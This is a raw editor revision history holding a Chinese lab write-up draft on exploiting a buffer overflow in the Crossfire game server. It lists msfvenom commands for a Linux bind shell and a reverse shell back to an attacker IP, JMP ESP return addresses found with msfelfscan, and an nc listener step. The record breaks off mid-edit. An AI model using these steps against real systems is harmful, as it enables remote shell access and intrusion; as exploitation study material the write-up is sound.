{"compress":true,"commitItems":[["4e85b9bf-cb62-4c8b-a419-2ce6ccbb5c74",1580209878340,"",[[1580209827023,["whale@Whale",[[1,0,"缓冲区溢出（四）\n===\n\n\n"]],[0,0],[15,15]]],[1580210012638,["whale@Whale",[[1,15,"## 寻找返回地址\r\n现在我们知道要到达ESP寄存器指向的缓冲区，我们需要找到一条指令，例如JMP ESP，它将把我们带到ESP寄存器指向的地址。 Evans Debugger具有简单的操作码搜索功能，这个任务容易。\r\n\r\nctrl + o 快捷键搜索操作码\r\n\r\nollydbg\r\n"]],[15,15],[157,157]]],[1580210014268,["whale@Whale",[[-1,14,"\n"],[-1,24,"\r"],[-1,123,"\r"],[-1,125,"\r"],[-1,144,"\r"],[-1,146,"\r"],[-1,155,"\r"]],[14,14],[13,13]]],[1580210014905,["whale@Whale",[[-1,13,"\n"]],[13,13],[12,12]]],[1580210016605,["whale@Whale",[[1,149,"\n"]],[148,148],[149,149]]],[1580210016906,["whale@Whale",[[1,150,"\n"]],[149,149],[150,150]]],[1580210026640,["whale@Whale",[[1,58,"·"]],[58,58],[59,59]]],[1580210027779,["whale@Whale",[[-1,58,"·"]],[59,59],[58,58]]],[1580210028670,["whale@Whale",[[1,58,"`"]],[58,58],[59,59]]],[1580210033156,["whale@Whale",[[1,66,"`"]],[66,66],[67,67]]],[1580210207234,["whale@Whale",[[-1,143,"ollydbg\n"]],[143,151],[143,143]]],[1580210214763,["whale@Whale",[[1,143,"edb --run "]],[143,143],[153,153]]],[1580210254969,["whale@Whale",[[1,153,"```\n/usr/games/crossfire/bin/crossfire\n```"]],[153,153],[195,195]]],[1580210258138,["whale@Whale",[[-1,153,"```"]],[153,156],[153,153]]],[1580210260870,["whale@Whale",[[-1,153,"\n"]],[153,153],[153,153]]],[1580211341588,["whale@Whale",[[1,143,"\n"]],[142,142],[143,143]]],[1580211343513,["whale@Whale",[[1,143,"```"]],[143,143],[146,146]]]]],["e361e98e-a3c1-4e4d-b0eb-688be52dc6df",1580461286433,"缓冲区溢出（四）\n===\n## 寻找返回地址\n现在我们知道要到达ESP寄存器指向的缓冲区，我们需要找到一条指令，例如`JMP ESP`，它将把我们带到ESP寄存器指向的地址。 Evans Debugger具有简单的操作码搜索功能，这个任务容易。\n\nctrl + o 快捷键搜索操作码\n\n```\nedb --run /usr/games/crossfire/bin/crossfire\n```\n\n",[[1580461226033,["whale@Whale",[[1,196,"msfelfscan -j eax -f \r\n"]],[196,196],[219,219]]],[1580464425446,[null,[[-1,217,"\r"],[1,218,"\n"]],[217,217],[219,219]]],[1580464425446,[null,[[1,217,"\r"],[-1,217,"\n"]],[219,219],[217,217]]],[1580464377478,["whale@Whale",[[-1,211,"a"],[-1,217,"\r"]],[212,212],[211,211]]],[1580464382106,["whale@Whale",[[1,211,"sp"]],[211,211],[213,213]]],[1580464382734,["whale@Whale",[[-1,213,"x"]],[213,213],[213,213]]],[1580464444251,["whale@Whale",[[1,217,"```\n /usr/games/crossfire/bin/crossfire\n```"]],[217,217],[260,260]]],[1580464447583,["whale@Whale",[[-1,217,"```"]],[217,220],[217,217]]],[1580464448926,["whale@Whale",[[-1,217,"\n"]],[217,217],[217,217]]],[1580464481470,["whale@Whale",[[1,88,"\n"]],[88,88],[89,89]]],[1580464481724,["whale@Whale",[[1,89,"\n"]],[89,89],[90,90]]],[1580464482134,["whale@Whale",[[1,90,"\n"]],[90,90],[91,91]]],[1580464488658,["whale@Whale",[[1,90,"### edb"]],[90,90],[97,97]]],[1580464496978,["whale@Whale",[[-1,124,"，这个任务容易。"]],[131,131],[124,124]]],[1580464498089,["whale@Whale",[[1,124,"."]],[124,124],[125,125]]],[1580464499477,["whale@Whale",[[-1,124,"."]],[125,125],[124,124]]],[1580464500184,["whale@Whale",[[1,124,"。"]],[124,124],[125,125]]],[1580464501468,["whale@Whale",[[-1,126,"\n"]],[125,125],[125,125]]],[1580464502135,["whale@Whale",[[-1,125,"\n"]],[125,125],[125,125]]],[1580464506755,["whale@Whale",[[1,197,"\n"]],[196,196],[197,197]]],[1580464511419,["whale@Whale",[[1,197,"### msfelfscan"]],[197,197],[211,211]]],[1580464512256,["whale@Whale",[[1,212,"\n"]],[211,211],[212,212]]],[1580464514028,["whale@Whale",[[1,212,"```"]],[212,212],[215,215]]],[1580464567799,["whale@Whale",[[1,273,"\n"]],[272,272],[273,273]]],[1580464568730,["whale@Whale",[[1,273,"0x08134597   jmp esp\r\n0x081345d7   jmp esp\r\n0x08134727   jmp esp\r\n0x081349c7   jmp esp\r\n0x08134ad7   jmp esp\r\n0x08134f87   jmp esp\r\n"]],[273,273],[405,405]]],[1580464572662,["whale@Whale",[[1,197,"\n"],[-1,293,"\r"],[-1,315,"\r"],[-1,337,"\r"],[-1,359,"\r"],[-1,381,"\r"],[-1,403,"\r"]],[196,196],[197,197]]],[1580464587938,["whale@Whale",[[1,197,"但是经过搜索，没有找到任何jmpe"]],[197,197],[214,214]]],[1580464588495,["whale@Whale",[[-1,213,"e"]],[214,214],[213,213]]],[1580464588762,["whale@Whale",[[1,213," "]],[213,213],[214,214]]],[1580464589654,["whale@Whale",[[-1,210,"jmp "]],[214,214],[210,210]]],[1580464596264,["whale@Whale",[[1,210,"有效的跳转地址，"]],[210,210],[218,218]]],[1580464597118,["whale@Whale",[[-1,217,"，"]],[218,218],[217,217]]],[1580464604902,["whale@Whale",[[1,217,"。怀疑是"]],[217,217],[221,221]]],[1580464608773,["whale@Whale",[[1,221,"版本过于"]],[221,221],[225,225]]],[1580464611403,["whale@Whale",[[-1,223,"过于"]],[225,225],[223,223]]],[1580464621795,["whale@Whale",[[1,223,"不是最新版，有bug，但是apt-get i"]],[223,223],[245,245]]],[1580464622664,["whale@Whale",[[-1,244,"i"]],[245,245],[244,244]]],[1580464632621,["whale@Whale",[[1,244,"upgrade edb，报了错。"]],[244,244],[260,260]]],[1580464633038,["whale@Whale",[[1,261,"\n"]],[260,260],[261,261]]],[1580464633226,["whale@Whale",[[1,262,"\n"]],[261,261],[262,262]]],[1580464664793,["whale@Whale",[[1,261,"The following packages have unmet dependencies:\r\n emacs-common : Breaks: edb (< 1.32) but 1.31-3 is to be installed\r\nE: Broken packages\r\n"]],[261,261],[398,398]]],[1580464725414,[null,[[-1,308,"\r"],[1,309,"\n"],[-1,376,"\r"],[1,377,"\n"],[-1,396,"\r"],[1,397,"\n"]],[308,308],[398,398]]],[1580464725414,[null,[[1,308,"\r"],[-1,308,"\n"],[1,376,"\r"],[-1,376,"\n"],[1,396,"\r"],[-1,396,"\n"]],[398,398],[308,308]]],[1580464666590,["whale@Whale",[[1,261,"\n"],[-1,308,"\r"],[-1,376,"\r"],[-1,396,"\r"]],[260,260],[261,261]]],[1580464667352,["whale@Whale",[[1,261,"·"]],[261,261],[262,262]]],[1580464668242,["whale@Whale",[[-1,261,"·"]],[262,262],[261,261]]],[1580464669063,["whale@Whale",[[1,261,"```"]],[261,261],[264,264]]],[1580464671061,["whale@Whale",[[1,399,"```"]],[399,399],[402,402]]],[1580470216816,["whale@Whale",[[1,403,"f"]],[403,403],[404,404]]],[1580470217432,["whale@Whale",[[-1,403,"f"]],[404,404],[403,403]]],[1580470222032,["whale@Whale",[[1,403,"放弃使用edb"]],[403,403],[410,410]]],[1580471878294,["whale@Whale",[[1,13,"\n"]],[12,12],[13,13]]],[1580471881041,["whale@Whale",[[1,13,"## s"]],[13,13],[17,17]]],[1580471881703,["whale@Whale",[[-1,16,"s"]],[17,17],[16,16]]],[1580471885888,["whale@Whale",[[1,16,"生成shellcode"]],[16,16],[27,27]]],[1580471886217,["whale@Whale",[[1,28,"\n"]],[27,27],[28,28]]],[1580471890651,["whale@Whale",[[1,28,"目标是linux"]],[28,28],[36,36]]],[1580472009237,["whale@Whale",[[1,37,"\n"]],[36,36],[37,37]]],[1580472009441,["whale@Whale",[[1,38,"\n"]],[37,37],[38,38]]],[1580472011219,["whale@Whale",[[1,38,"msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b\r\n\"\\x00\\x0a\\x0d\\x20\" –e x86/shikata_ga_nai"]],[38,38],[135,135]]],[1580472014486,["whale@Whale",[[-1,93,"\r"],[1,135,"\n"]],[134,134],[135,135]]],[1580472014705,["whale@Whale",[[1,136,"\n"]],[135,135],[136,136]]],[1580472044007,["whale@Whale",[[-1,28,"目标是linux"],[1,36,"\\x00\\x09\\x0a\\x20"]],[135,135],[44,44]]],[1580472058837,["whale@Whale",[[1,13,"\n"]],[12,12],[13,13]]],[1580472060893,["whale@Whale",[[1,12,"[https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/](https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/)"]],[12,12],[140,140]]],[1580472063109,["whale@Whale",[[1,12,"\n"]],[12,12],[13,13]]],[1580472086809,["whale@Whale",[[-1,14,"https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/"]],[14,76],[14,14]]],[1580472088639,["whale@Whale",[[1,14,"# 缓冲区溢出案例（三）"]],[14,14],[26,26]]],[1580472092094,["whale@Whale",[[-1,14,"# "]],[16,16],[14,14]]],[1580472097190,["whale@Whale",[[1,13,"sh"]],[13,13],[15,15]]],[1580472097711,["whale@Whale",[[-1,13,"sh"]],[15,15],[13,13]]],[1580472099956,["whale@Whale",[[1,13,"上一篇："]],[13,13],[17,17]]],[1580472113878,["whale@Whale",[[-1,192,"a\\x0d"],[1,197,"9\\x0a"]],[185,201],[201,201]]],[1580472143342,["whale@Whale",[[1,183," "]],[128,224],[184,184]]],[1580472144249,["whale@Whale",[[-1,184,"\n"]],[184,184],[184,184]]],[1580472146441,["whale@Whale",[[-1,183," "]],[184,184],[183,183]]],[1580472147701,["whale@Whale",[[1,183," "]],[183,183],[184,184]]],[1580472192639,["whale@Whale",[[1,176,"EXITFUNC=thread  "]],[176,176],[193,193]]],[1580472193469,["whale@Whale",[[-1,192," "]],[193,193],[192,192]]],[1580472287102,["whale@Whale",[[-1,195,"c"]],[196,196],[195,195]]],[1580472289675,["whale@Whale",[[1,195,"python"]],[195,195],[201,201]]],[1580472295527,["whale@Whale",[[1,128,"\n"]],[127,127],[128,128]]],[1580472299236,["whale@Whale",[[1,128,"```"]],[128,128],[131,131]]],[1580472300933,["whale@Whale",[[1,250,"```"]],[250,250],[253,253]]],[1580472304112,["whale@Whale",[[1,110,"s"]],[110,110],[111,111]]],[1580472304509,["whale@Whale",[[-1,110,"s"]],[111,111],[110,110]]],[1580472337014,["whale@Whale",[[1,110,"上一篇找到了这些坏字符，在生成shellcode的时候必须避免这些字符出现在"]],[110,110],[148,148]]],[1580472340027,["whale@Whale",[[-1,147,"在"]],[148,148],[147,147]]],[1580472341012,["whale@Whale",[[1,147,"`"]],[147,147],[148,148]]],[1580472342278,["whale@Whale",[[1,164,"`"]],[164,164],[165,165]]],[1580472354495,["whale@Whale",[[1,289,"\n"]],[288,288],[289,289]]],[1580472354803,["whale@Whale",[[1,290,"\n"]],[289,289],[290,290]]],[1580472362195,["whale@Whale",[[1,290,"EXITFUNC=thread"]],[290,290],[305,305]]],[1580472362600,["whale@Whale",[[1,306,"\n"]],[305,305],[306,306]]],[1580472382961,["whale@Whale",[[1,305," t"]],[305,305],[307,307]]],[1580472383557,["whale@Whale",[[-1,306,"t"]],[307,307],[306,306]]],[1580472388592,["whale@Whale",[[1,306,"添加安全退出功能"]],[306,306],[314,314]]],[1580472388820,["whale@Whale",[[1,316,"\n"]],[314,314],[315,315]]],[1580472535293,["whale@Whale",[[-1,316,"\n"]],[316,316],[315,315]]],[1580472536684,["whale@Whale",[[-1,290,"EXITFUNC=thread 添加安全退出功能\n"]],[290,315],[290,290]]],[1580472537045,["whale@Whale",[[-1,290,"\n"]],[290,290],[289,289]]],[1580472537525,["whale@Whale",[[-1,289,"\n"]],[289,289],[288,288]]],[1580474653497,["whale@Whale",[[1,289,"\n"]],[288,288],[289,289]]],[1580474653782,["whale@Whale",[[1,290,"\n"]],[289,289],[290,290]]],[1580474655989,["whale@Whale",[[1,290,"```\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.67.128 LPORT=443 -b \"\\x00\" -e x86/shikata_ga_nai -f c\n```"]],[290,290],[403,403]]],[1580474659250,["whale@Whale",[[-1,400,"```"]],[400,403],[400,400]]],[1580474660114,["whale@Whale",[[-1,290,"```"]],[290,293],[290,290]]],[1580474676739,["whale@Whale",[[-1,303,"windows"],[1,310,"linux/x86"]],[303,310],[312,312]]],[1580474698667,["whale@Whale",[[1,370,"\\x09\\x0a\\x20"]],[365,371],[383,383]]],[1580474709523,["whale@Whale",[[-1,409,"c"]],[409,409],[409,409]]],[1580474712903,["whale@Whale",[[1,409,"python"]],[409,409],[415,415]]],[1580474729123,["whale@Whale",[[1,362,"EXITFUNC=thread  "]],[362,362],[379,379]]],[1580474729843,["whale@Whale",[[-1,378," "]],[379,379],[378,378]]],[1580475093119,["whale@Whale",[[1,171,"\n"]],[170,170],[171,171]]],[1580475144431,["whale@Whale",[[1,171,"[]"]],[171,171],[173,173]]],[1580475152029,["whale@Whale",[[1,172,"目标主机ip"]],[172,172],[178,178]]],[1580475153982,["whale@Whale",[[1,179," "]],[179,179],[180,180]]],[1580475186465,["whale@Whale",[[1,178,"-"]],[178,178],[179,179]]],[1580475189415,["whale@Whale",[[1,179,"linux"]],[179,179],[184,184]]],[1580475191614,["whale@Whale",[[1,187,"\n"]],[186,186],[187,187]]],[1580475193764,["whale@Whale",[[1,187,"[]"]],[187,187],[189,189]]],[1580475197293,["whale@Whale",[[1,188,"go"]],[188,188],[190,190]]],[1580475197839,["whale@Whale",[[-1,188,"go"]],[190,190],[188,188]]],[1580475202118,["whale@Whale",[[1,188,"攻击机器"]],[188,188],[192,192]]],[1580475202322,["whale@Whale",[[-1,191,"器"]],[192,192],[191,191]]],[1580475203511,["whale@Whale",[[1,191,"ip"]],[191,191],[193,193]]],[1580475207215,["whale@Whale",[[1,186,"192.168.67.128"]],[186,186],[200,200]]],[1580475210104,["whale@Whale",[[1,208,"192.168.67.128"]],[208,208],[222,222]]],[1580475211222,["whale@Whale",[[-1,220,"28"]],[222,222],[220,220]]],[1580475217135,["whale@Whale",[[1,208,"         "]],[208,208],[217,217]]],[1580475219407,["whale@Whale",[[1,230,"\n"]],[229,229],[230,230]]],[1580475229136,["whale@Whale",[[-1,409,"28"]],[411,411],[409,409]]],[1580475418444,["whale@Whale",[[1,231,"\n"]],[230,230],[231,231]]],[1580475427143,["whale@Whale",[[1,230,"[攻击机ip] "]],[230,230],[238,238]]],[1580475429622,["whale@Whale",[[-1,234,"i"]],[235,235],[234,234]]],[1580475430493,["whale@Whale",[[1,234,"z"]],[234,234],[235,235]]],[1580475433232,["whale@Whale",[[-1,234,"z"]],[235,235],[234,234]]],[1580475435795,["whale@Whale",[[1,234,"执行命令"]],[234,234],[238,238]]],[1580475441063,["whale@Whale",[[1,240,"。/"]],[240,240],[242,242]]],[1580475441853,["whale@Whale",[[-1,240,"。/"]],[242,242],[240,240]]],[1580475447888,["whale@Whale",[[1,240,"./nc.exe -lnvp 4444"]],[240,240],[259,259]]],[1580475454293,["whale@Whale",[[-1,448,"3"]],[449,449],[448,448]]],[1580475455590,["whale@Whale",[[1,448,"44"]],[448,448],[450,450]]],[1580476037425,[null,[[-1,238,"p"],[1,240," "],[-1,259," "],[-1,450,"3"],[1,451,"4"]],[238,238],[452,452]]],[1580476037425,[null,[[1,238,"p"],[-1,239," "],[1,259," "],[1,449,"3"],[-1,449,"4"]],[452,452],[238,238]]],[1580476026295,["whale@Whale",[[-1,230,"[攻击机执行命令] ./nc.exe -lnvp 4444"]],[230,259],[230,230]]],[1580476097395,[null,[[-1,230," "],[-1,421,"3"],[1,422,"4"]],[230,230],[423,423]]],[1580476097395,[null,[[1,230," "],[1,420,"3"],[-1,420,"4"]],[423,423],[230,230]]],[1580476044013,["whale@Whale",[[-1,1103,"\n"],[1,1104,"### "]],[1103,1103],[1107,1107]]],[1580476045477,["whale@Whale",[[-1,1105,"# "]],[1107,1107],[1105,1105]]],[1580476047315,["whale@Whale",[[1,1105," ze"]],[1105,1105],[1108,1108]]],[1580476047806,["whale@Whale",[[-1,1106,"ze"]],[1108,1108],[1106,1106]]],[1580476048387,["whale@Whale",[[1,1106,"exp"]],[1106,1106],[1109,1109]]],[1580476049869,["whale@Whale",[[1,1109,"\n\n[攻击机执行命令] ./nc.exe -lnvp 4444"]],[1109,1109],[1139,1139]]],[1580476157413,[null,[[-1,230," "],[-1,421,"3"],[1,422,"4"],[1,1103,"\n"],[-1,1109,"\n"]],[230,230],[1109,1109]]],[1580476157413,[null,[[1,230," "],[1,420,"3"],[-1,420,"4"],[-1,1102,"\n"],[1,1109,"\n"]],[1109,1109],[230,230]]],[1580476128174,["whale@Whale",[[1,1140,"\n"]],[1139,1139],[1140,1140]]],[1580476217413,[null,[[-1,230," "],[-1,421,"3"],[1,422,"4"],[1,1103,"\n"],[-1,1109,"\n"]],[230,230],[1109,1109]]],[1580476217413,[null,[[1,230," "],[1,420,"3"],[-1,420,"4"],[-1,1102,"\n"],[1,1109,"\n"]],[1109,1109],[230,230]]],[1580476157526,["whale@Whale",[[1,1141,"\n"]],[1139,1139],[1140,1140]]],[1580476159334,["whale@Whale",[[1,1140,"[攻击机ip] "]],[1140,1140],[1148,1148]]],[1580476165610,["whale@Whale",[[-1,1144,"ip"]],[1146,1146],[1144,1144]]],[1580476171791,["whale@Whale",[[1,1146,"python exp.py"]],[1146,1146],[1159,1159]]],[1580476172072,["whale@Whale",[[1,1161,"\n"]],[1159,1159],[1160,1160]]],[1580476200851,["whale@Whale",[[1,1162,"\n"]],[1160,1160],[1161,1161]]],[1580476203330,["whale@Whale",[[1,1161,"[]()"]],[1161,1161],[1165,1165]]],[1580476205384,["whale@Whale",[[-1,1163,"()"]],[1165,1165],[1163,1163]]],[1580476216083,["whale@Whale",[[1,633,"[]"]],[633,677],[635,635]]],[1580476277413,[null,[[-1,230," "],[-1,421,"3"],[1,422,"4"],[1,633,"\n"],[-1,635,"\n"],[1,1105,"\n"],[-1,1111,"\n"],[1,1142,"\n"],[-1,1165,"\n"]],[230,230],[1165,1165]]],[1580476277413,[null,[[1,230," "],[1,420,"3"],[-1,420,"4"],[-1,632,"\n"],[1,635,"\n"],[-1,1104,"\n"],[1,1111,"\n"],[-1,1141,"\n"],[1,1165,"\n"]],[1165,1165],[230,230]]],[1580476220056,["whale@Whale",[[1,634,"m"]],[634,634],[635,635]]],[1580476220622,["whale@Whale",[[-1,634,"m"]],[635,635],[634,634]]],[1580476231795,["whale@Whale",[[1,634,"目标机执行bof程序"]],[634,634],[644,644]]],[1580476241996,["whale@Whale",[[-1,1173,"[]"]],[1173,1175],[1173,1173]]],[1580476518430,[null,[[-1,230," "],[1,232,""],[-1,421,"3"],[1,422,"4"],[1,633,"\n"],[-1,645,"\n"],[1,1115,"\n"],[-1,1121,"\n"],[1,1152,"\n"],[-1,1171,"\n"]],[230,230],[1171,1171]]],[1580476518430,[null,[[1,230," "],[-1,231,""],[1,420,"3"],[-1,420,"4"],[-1,632,"\n"],[1,645,"\n"],[-1,1114,"\n"],[1,1121,"\n"],[-1,1151,"\n"],[1,1171,"\n"]],[1171,1171],[230,230]]],[1580476498217,["whale@Whale",[[-1,482,"-f python"]],[482,491],[482,482]]],[1580476501641,["whale@Whale",[[1,439,"f python- "]],[438,438],[448,448]]]]],["74953e14-5552-4c3b-9446-984c062e278b",1580616692892,"缓冲区溢出（四）\n===\n上一篇：[缓冲区溢出案例（三）](https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/)\n\n## 生成shellcode\n上一篇找到了这些坏字符，在生成shellcode的时候必须避免这些字符出现`\\x00\\x09\\x0a\\x20`\n\n```\n[目标主机ip-linux] 192.168.67.128\n[攻击机ip]         192.168.67.1\n\n\nmsfvenom -p linux/x86/shell_bind_tcp LPORT=4444 EXITFUNC=thread -f python -b \"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.67.1 LPORT=4444 EXITFUNC=thread -f python -b \"\\x00\\x09\\x0a\\x20\" -e x86/shikata_ga_nai \n\n```\n\n## 寻找返回地址\n现在我们知道要到达ESP寄存器指向的缓冲区，我们需要找到一条指令，例如`JMP ESP`，它将把我们带到ESP寄存器指向的地址。 \n\n### edb\nEvans Debugger具有简单的操作码搜索功能。ctrl + o 快捷键搜索操作码\n\n```\n[目标机执行bof程序]edb --run /usr/games/crossfire/bin/crossfire\n```\n但是经过搜索，没有找到任何有效的跳转地址。怀疑是版本不是最新版，有bug，但是apt-get upgrade edb，报了错。\n```\nThe following packages have unmet dependencies:\n emacs-common : Breaks: edb (< 1.32) but 1.31-3 is to be installed\nE: Broken packages\n```\n放弃使用edb\n### msfelfscan\n```\nmsfelfscan -j esp -f  /usr/games/crossfire/bin/crossfire\n0x08134597   jmp esp\n0x081345d7   jmp esp\n0x08134727   jmp esp\n0x081349c7   jmp esp\n0x08134ad7   jmp esp\n0x08134f87   jmp esp\n\n```\n## exp\n[攻击机执行命令] ./nc.exe -lnvp 4444\n[攻击机] python exp.py\n\n\n\n",[[1580616663325,["whale@Whale",[[1,1123,"\n"]],[1122,1122],[1123,1123]]],[1580616663490,["whale@Whale",[[1,1124,"\n"]],[1123,1123],[1124,1124]]],[1580616670653,["whale@Whale",[[1,1123,"缓冲区"]],[1123,1123],[1126,1126]]],[1580616671721,["whale@Whale",[[-1,1123,"缓冲区"]],[1126,1126],[1123,1123]]],[1580628043984,["whale@Whale",[[1,1123,"0x08134597   jmp esp"]],[1123,1123],[1143,1143]]],[1580635141838,["whale@Whale",[[1,1198,"![1]($res/1.png)\n\n"]],[1197,1197],[1215,1215]]]]],["4f7cf6a0-443a-4cda-809c-a73e8b4d678f",1580747545570,"缓冲区溢出（四）\n===\n上一篇：[缓冲区溢出案例（三）](https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/)\n\n## 生成shellcode\n上一篇找到了这些坏字符，在生成shellcode的时候必须避免这些字符出现`\\x00\\x09\\x0a\\x20`\n\n```\n[目标主机ip-linux] 192.168.67.128\n[攻击机ip]         192.168.67.1\n\n\nmsfvenom -p linux/x86/shell_bind_tcp LPORT=4444 EXITFUNC=thread -f python -b \"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.67.1 LPORT=4444 EXITFUNC=thread -f python -b \"\\x00\\x09\\x0a\\x20\" -e x86/shikata_ga_nai \n\n```\n\n## 寻找返回地址\n现在我们知道要到达ESP寄存器指向的缓冲区，我们需要找到一条指令，例如`JMP ESP`，它将把我们带到ESP寄存器指向的地址。 \n\n### edb\nEvans Debugger具有简单的操作码搜索功能。ctrl + o 快捷键搜索操作码\n\n```\n[目标机执行bof程序]edb --run /usr/games/crossfire/bin/crossfire\n```\n但是经过搜索，没有找到任何有效的跳转地址。怀疑是版本不是最新版，有bug，但是apt-get upgrade edb，报了错。\n```\nThe following packages have unmet dependencies:\n emacs-common : Breaks: edb (< 1.32) but 1.31-3 is to be installed\nE: Broken packages\n```\n放弃使用edb\n### msfelfscan\n```\nmsfelfscan -j esp -f  /usr/games/crossfire/bin/crossfire\n0x08134597   jmp esp\n0x081345d7   jmp esp\n0x08134727   jmp esp\n0x081349c7   jmp esp\n0x08134ad7   jmp esp\n0x08134f87   jmp esp\n\n```\n## exp\n0x08134597   jmp esp\n\n[攻击机执行命令] ./nc.exe -lnvp 4444\n[攻击机] python exp.py\n\n\n\n![1]($res/1.png)\n\n",[[1580747542661,["whale@Whale",[[1,493,"msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b\r\n\"\\x00\\x0a\\x0d\\x20\" –e x86/shikata_ga_nai"]],[493,493],[590,590]]],[1580747544521,["whale@Whale",[[1,493,"\n"],[-1,548,"\r"]],[493,493],[494,494]]],[1580747549859,["whale@Whale",[[-1,513,"86"]],[515,515],[513,513]]],[1580747553511,["whale@Whale",[[1,513,"64"]],[513,513],[515,515]]],[1580747569776,["whale@Whale",[[-1,558,"a\\x0d"],[1,563,"9\\x0a"]],[551,567],[567,567]]],[1580747576812,["whale@Whale",[[-1,549,"\n"]],[549,549],[549,549]]],[1580747579021,["whale@Whale",[[1,549," "]],[549,549],[550,550]]],[1580817672838,["whale@Whale",[[-1,513,"64"]],[515,515],[513,513]]],[1580817674773,["whale@Whale",[[1,513,"32"]],[513,513],[515,515]]],[1580817839735,["whale@Whale",[[1,94,"j"]],[94,94],[95,95]]],[1580817840542,["whale@Whale",[[-1,94,"j"]],[95,95],[94,94]]],[1580817842599,["whale@Whale",[[1,94,"经过一次"]],[94,94],[98,98]]],[1580817844162,["whale@Whale",[[-1,96,"一次"]],[98,98],[96,96]]],[1580817846855,["whale@Whale",[[1,96,"一些是啊比"]],[96,96],[101,101]]],[1580817847963,["whale@Whale",[[-1,98,"是啊比"]],[101,101],[98,98]]],[1580817851237,["whale@Whale",[[1,98,"失败的尝试，"]],[98,98],[104,104]]],[1580817859397,["whale@Whale",[[1,104,"程序是"]],[104,104],[107,107]]],[1580817869390,["whale@Whale",[[-1,104,"程序是"]],[107,107],[104,104]]],[1580817880278,["whale@Whale",[[1,104,"crossfire程序只能在32位置"]],[104,104],[122,122]]],[1580817880405,["whale@Whale",[[-1,121,"置"]],[122,122],[121,121]]],[1580817892162,["whale@Whale",[[1,121,"运行。"]],[121,121],[124,124]]],[1580817906076,["whale@Whale",[[1,118,"linux "]],[118,118],[124,124]]],[1580817909038,["whale@Whale",[[-1,127,"运行。"]],[130,130],[127,127]]],[1580817914309,["whale@Whale",[[1,127,"成功反弹shell."]],[127,127],[137,137]]],[1580817914780,["whale@Whale",[[-1,136,"."]],[137,137],[136,136]]],[1580817915099,["whale@Whale",[[1,136,"。"]],[136,136],[137,137]]],[1580817944984,["whale@Whale",[[1,18,"# crossfire&linux"]],[18,28],[45,45]]],[1580817949460,["whale@Whale",[[-1,18,"# "]],[20,20],[18,18]]],[1580817950923,["whale@Whale",[[1,109,"\n"]],[109,109],[110,110]]],[1580817953202,["whale@Whale",[[1,154,"\n"]],[154,154],[155,155]]],[1580818948391,["whale@Whale",[[1,155,"\n"]],[154,154],[155,155]]],[1580818951169,["whale@Whale",[[1,155,"## 坏字符"]],[155,155],[161,161]]],[1580818951398,["whale@Whale",[[1,162,"\n"]],[161,161],[162,162]]],[1580818951734,["whale@Whale",[[1,162,"09得注意,fscanf遇到制表符(\\t，0x09)时会被截断,之前测试时遇到这个坑\r\n右键esp, following dump"]],[162,162],[227,227]]],[1580818952846,["whale@Whale",[[-1,204,"\r"],[1,227,"\n"]],[227,227],[228,228]]],[1580818953191,["whale@Whale",[[1,228,"\n"]],[228,228],[229,229]]],[1580818964886,["whale@Whale",[[1,228,"\\x90\\x0a\\x00"]],[228,228],[240,240]]],[1580818965509,["whale@Whale",[[1,241,"\n"]],[240,240],[241,241]]],[1580818969782,["whale@Whale",[[1,228,"\n"]],[227,227],[228,228]]],[1580818970166,["whale@Whale",[[1,228,"c"]],[228,228],[229,229]]],[1580818970748,["whale@Whale",[[-1,228,"c"]],[229,229],[228,228]]],[1580818973926,["whale@Whale",[[1,228,"重新测试坏字符"]],[228,228],[235,235]]],[1580818983350,["whale@Whale",[[1,250,"\n"]],[249,249],[250,250]]],[1580818983885,["whale@Whale",[[1,250,"msfvenom -p linux/x32/shell_bind_tcp LPORT=4444 -f c -b \"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai"]],[250,250],[346,346]]],[1580818984775,["whale@Whale",[[1,347,"\n"]],[346,346],[347,347]]],[1580818984982,["whale@Whale",[[1,348,"\n"]],[347,347],[348,348]]],[1580818993063,["whale@Whale",[[-1,319,"\\x20"]],[323,323],[319,319]]],[1580818995496,["whale@Whale",[[-1,301,"c"]],[302,302],[301,301]]],[1580818997557,["whale@Whale",[[1,301,"python"]],[301,301],[307,307]]],[1580819029821,["whale@Whale",[[-1,269,"32"]],[270,270],[269,269]]],[1580819031011,["whale@Whale",[[1,269,"86"]],[269,269],[271,271]]],[1580819264012,["whale@Whale",[[-1,349,"\n"]],[349,349],[348,348]]],[1580820000755,["whale@Whale",[[-1,205,"右键esp, following dump\n"]],[205,227],[205,205]]],[1580820009771,["whale@Whale",[[-1,193,",之前测试时遇到这个坑"]],[193,204],[193,193]]],[1580820011917,["whale@Whale",[[1,161,"\\"]],[161,161],[162,162]]],[1580820012899,["whale@Whale",[[-1,161,"\\"]],[162,162],[161,161]]],[1580820014403,["whale@Whale",[[1,162,"\n"]],[161,161],[162,162]]],[1580820016242,["whale@Whale",[[-1,204,"\\"]],[204,204],[204,204]]],[1580820017745,["whale@Whale",[[1,204,"\\"]],[204,204],[205,205]]],[1580820019918,["whale@Whale",[[1,204,"`"]],[204,204],[205,205]]],[1580820021858,["whale@Whale",[[1,217,"`"]],[205,205],[218,218]]],[1580822027346,["whale@Whale",[[1,319,"\n"]],[318,318],[319,319]]],[1580822029919,["whale@Whale",[[1,319,"## 